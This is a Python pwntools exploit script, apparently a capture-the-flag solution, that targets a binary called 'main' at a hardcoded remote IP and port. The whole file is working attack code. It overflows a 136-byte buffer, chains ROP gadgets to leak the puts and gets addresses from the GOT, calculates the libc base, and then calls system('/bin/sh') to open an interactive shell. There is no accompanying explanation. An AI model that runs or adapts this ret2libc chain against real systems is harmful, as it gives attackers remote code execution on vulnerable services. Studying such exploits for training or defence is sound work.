from pwn import *
import sys

binary = "./main"
remote_conn = "34.107.71.117 32222"
context.log_level = "critical"

if len(sys.argv) > 1 and sys.argv[1] == "l":
    r = process(binary)
    elf = context.binary = ELF(binary)
elif len(sys.argv) > 1 and sys.argv[1] == "r":
    r = remote(remote_conn.split(" ")[0], int(remote_conn.split(" ")[1]))
    elf = ELF(binary)
else:
    print("Usage: python " + sys.argv[0] + " [l|r]")
    sys.exit()

pop_rdi_ret = 0x00000000004011f3
ret = 0x000000000040101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

payload = b"A" * 136
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
r.sendline(payload)
r.recvline()
leak_puts = u64(r.recvline().strip(b'\n').ljust(8, b"\x00"))
print("leak puts: ", hex(leak_puts))

payload = b"A" * 136
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(elf.got["gets"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
r.sendline(payload)
r.recvline()
leak_gets = u64(r.recvline().strip(b'\n').ljust(8, b"\x00"))
print("leak gets: ", hex(leak_gets))

if(sys.argv[1] == 'l'):
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc=ELF("./libctarget.so")

libc.address = leak_gets - libc.sym["gets"]
bin_sh = next(libc.search(b"/bin/sh"))
print("libc base: ", hex(libc.address))
print("/bin/sh: ", hex(bin_sh))
print("system: ", hex(libc.sym["system"]))
payload = b"A" * 136
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(libc.sym["system"])

if(sys.argv[1] == "l"):
    gdb.attach(r)

r.sendline(payload)
r.recvline()
r.interactive()

